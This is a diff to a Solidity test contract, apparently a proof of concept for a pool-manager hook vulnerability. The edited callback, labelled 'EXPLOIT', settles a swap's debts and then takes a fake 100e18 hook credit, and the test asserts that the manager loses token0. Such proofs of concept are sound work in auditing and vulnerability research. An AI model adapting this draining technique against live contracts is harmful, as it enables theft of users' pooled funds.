@@ -46,20 +46,20 @@ contract POC is Test {
             if(delta.amount0()>0) manager.take(c0, address(this), uint128(delta.amount0()));
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
+            // EXPLOIT
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            // FIX: hook returns 100e18, not 10e18 - take 100e18 FIRST
-            manager.take(c0, address(this), 100e18);
-            // then clear the swap leftovers
+            // 1. First settle what the swap owes (100.06e18 and 0.03e18)
             if(s.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-s.amount0())); manager.settle();}
             if(s.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-s.amount1())); manager.settle();}
-            if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
-            if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
+            // 2. Then take the fake hook credit - 100e18
+            manager.take(c0, address(this), 100e18);
         }
         return "";
     }
     function test_afterSwapReturnDelta() public {
-        uint b = token0.balanceOf(address(manager));
+        uint bBefore = token0.balanceOf(address(manager));
         manager.unlock(abi.encode(uint256(2)));
-        assertLt(token0.balanceOf(address(manager)), b);
+        uint bAfter = token0.balanceOf(address(manager));
+        assertLt(bAfter, bBefore, "manager should lose token0");
     }
 }
